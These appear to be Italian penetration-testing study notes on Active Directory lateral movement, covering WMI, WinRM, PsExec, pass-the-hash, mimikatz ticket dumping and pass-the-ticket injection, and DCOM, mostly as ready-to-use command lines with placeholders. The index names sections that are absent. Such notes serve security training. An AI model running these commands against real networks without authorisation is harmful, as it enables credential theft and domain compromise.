

---
#### INDICE

- [[#Introduzione]]
- [[#WMI and WinRM]]
- [[#PsExec]]
- [[#Pass the Hash]]
- [[#Overpass the Hash]]
- [[#Pass the Ticket]]
- [[#DCOM]]
- [[#Persistence AD]]

---
---
---
### Introduzione
Il **Lateral Movement in Active Directory** rappresenta l’insieme di tecniche utilizzate da un attaccante per **spostarsi lateralmente tra host del dominio** dopo aver ottenuto credenziali valide (password, hash NTLM o ticket Kerberos).

Obiettivi principali:

- Espandere il controllo su più sistemi
- Raggiungere asset critici (File Server, DC, SQL, Exchange)
- Ottenere privilegi di dominio


---

### WMI and WinRM
#### WMI – Esecuzione remota

```
wmic /node:<TARGET> /user:<DOMAIN\USER> /password:<PASS> process call create "cmd.exe /c whoami"
```

Con *PowerShell* se si ha un'utenza amministrativa sul target:

```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET
```

#### WinRM – PowerShell Remoting

```
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\User
```

Oppure comando singolo:

```
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
```

---
### PsExec
Affinché PsExec possa essere utilizzato per il movimento laterale, devono essere soddisfatte **tre condizioni fondamentali**:

1. L’utente che si autentica deve appartenere al **gruppo Administrators locale** del sistema target
2. La share **ADMIN$** deve essere accessibile
3. Il servizio **File and Printer Sharing** deve essere attivo

Le ultime due condizioni sono **abilitate di default** sui moderni sistemi Windows Server.

```
#Linux
psexec.py DOMAIN/User:Password@TARGET cmd 
```

```
# Windows
.\PsExec64.exe -i \\<HOSTNAME> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```

Con hash NTLM:

```
psexec.py DOMAIN/User@TARGET -hashes :<NTLM_HASH>
```

---
### Pass the Hash
Il **Pass-the-Hash (PtH)** consente l’autenticazione NTLM **senza conoscere la password**, utilizzando direttamente l’hash NTLM tramite protocollo SMB

```
wmiexec.py DOMAIN/User@TARGET -hashes :<NTLM_HASH>
```

---
### Pass the Ticket
Avvio di **mimikatz** e abilitazione dei privilegi di debug:

```
privilege::debug
```

Dump di **tutti i TGT/TGS** presenti in memoria:

```
sekurlsa::tickets /export
```

Elenco dei ticket esportati:

```
dir *.kirbi
```

Tra i file generati individuiamo un ticket del tipo:

```
<USERNAME>@cifs-<HOSTNAME>.kirbi
```

Il prefisso `cifs` indica che il ticket è valido per l’accesso SMB al server WEB04.

Iniezione del TGS selezionato nella sessione corrente:

```
kerberos::ptt [0;12bd0]-0-0-40810000-<USERNAME>@cifs-<HOSTNAME>.kirbi
```

Nessun errore indica che il ticket è stato correttamente caricato in memoria.

Verifica dei ticket presenti nella sessione:

```
klist
```

 Da adesso il sistema userà il ticket di generato per accedere al servizio CIFS.

---
### DCOM
**DCOM (Distributed COM)** permette l’esecuzione remota tramite oggetti COM, spesso usato da:

```
impacket-dcomexec.py DOMAIN/User:Password@TARGET
```

Con hash:

```
dcomexec.py DOMAIN/User@TARGET -hashes :<NTLM_HASH>
```
